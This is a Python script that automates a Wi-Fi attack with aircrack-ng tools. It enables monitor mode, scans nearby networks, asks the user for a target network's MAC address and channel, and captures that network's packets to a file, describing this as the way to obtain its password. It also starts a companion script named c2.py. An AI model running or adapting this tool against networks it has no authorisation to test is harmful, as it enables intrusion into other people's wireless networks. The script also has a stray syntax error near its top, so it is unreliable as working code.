#! /usr/bin/python3

#################################################################""")

import os

os.system ("sudo clear")

print ("""
=--------------------------------------------=
|Configuring monitor mode                     |
=--------------------------------------------=\n""")

print ("Interface devices\n")
os.system ('sudo iwconfig')

print ("""\n
%*************************************%
  Please type your network adapters name. (Most likely: wlan0, wlo1)
%*************************************%""")
wifi = input ('>> ')
os.system ('clear')

activar_modo_M = ("sudo airmon-ng start %s" %(wifi))
os.system (activar_modo_M)
os.system ('clear')

print ("""
=----------------------------------=
|Scanning nearby networks |
=----------------------------------=\n""")
os.system ('sudo iwconfig')

print ("""\n
%***********************************%
  Type your network adapters name in monitor mode. (Most likely: wlan0mon, wlo1mon)
%***********************************%""")
targetaM = input ('>> ')
airodump_ng = ("sudo airodump-ng %s" %(targetaM))
os.system ('clear')

print ("""
=--------=
|Attention  |
=--------=""")
print ("\nPress (Ctrl + C) when you find the network you want to target.\n")
input ("***Press (enter) to continue ***")
os.system (airodump_ng)

print ("\nType target's MAC Address")
macObjetivo = input (">> ")
print ("Type target network's channel")
canal_objetivo = input (">> ")

ruta1 = ("../captura/")
print ("\nType a name for capture file. (Any name you want)")
archivo_captura = input (">> ")
ruta_captura = (ruta1 + archivo_captura)
airodump_ng2 = ("sudo airodump-ng -w %s --bssid %s -c%s %s" % (ruta_captura, macObjetivo, canal_objetivo, targetaM))
os.system ('clear')

# Inicia a capturar los paquetes

print ("""
%********************%
Capturing packets
%********************%""")

print ("""Starting to capture packets, the password is found within them, it is recommended to wait until you have 10K beacons at least""")

print ("\nPress (enter) to continue")
os.system ('clear')

os.chdir ("../modules")
os.system ("gnome-terminal -- python3 c2.py")

os.system (airodump_ng2)

# Desactiva el modo Monitor
desactivar_modo_M = ("sudo airmon-ng stop %s" % (targetaM))
os.system (desactivar_modo_M)
os.system ('clear')
